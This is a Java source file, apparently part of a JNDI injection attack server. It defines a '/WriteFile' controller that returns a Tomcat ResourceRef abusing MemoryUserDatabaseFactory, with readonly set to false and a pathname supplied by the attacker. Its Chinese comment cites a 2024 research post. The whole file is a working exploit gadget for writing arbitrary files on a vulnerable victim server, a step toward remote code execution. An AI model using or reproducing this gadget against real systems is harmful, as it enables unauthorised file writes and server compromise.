package cn.butler.jndi.controller;

import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/**
 * 利用 MemoryUserDatabaseFactory 本地工厂类写文件
 * 学习：
 *  https://srcincite.io/blog/2024/07/21/jndi-injection-rce-via-path-manipulation-in-memoryuserdatabasefactory.html
 */
@JNDIController
@JNDIMapping("/WriteFile")
public class WriteFileController implements Controller{
    public Object process(String data) {
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, "org.apache.catalina.users.MemoryUserDatabaseFactory",null);
        ref.add(new StringRefAddr("readonly", "false"));
        ref.add(new StringRefAddr("pathname", data));

        return ref;
    }

    @JNDIMapping("/{pathname}")
    public String writeFileByMemoryUserDatabaseFactory(String pathname) {
        System.out.println("[MemoryUserDatabaseFactory] WriteFile: " + pathname);
        return pathname;
    }
}
